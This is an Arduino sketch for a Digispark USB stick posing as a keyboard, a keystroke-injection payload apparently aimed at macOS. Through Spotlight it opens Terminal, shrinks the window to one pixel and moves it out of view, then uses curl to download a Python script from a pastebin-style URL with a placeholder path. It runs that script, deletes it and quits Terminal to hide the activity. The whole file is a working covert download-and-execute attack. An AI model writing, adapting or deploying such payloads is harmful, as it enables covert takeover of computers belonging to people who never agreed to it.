#include "DigiKeyboard.h"
void setup() {
  //empty
}
void loop() {
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("term");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("printf \'\\e[8;1;1t\'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("printf \'\\e[3;0;0t\'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("curl https://pastbin.com/raw/YOURCODE -o \"j.py\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("python j.py");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(800);
  DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);
  DigiKeyboard.print("rm j.py");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
  for(;;){ /*empty*/ }
}
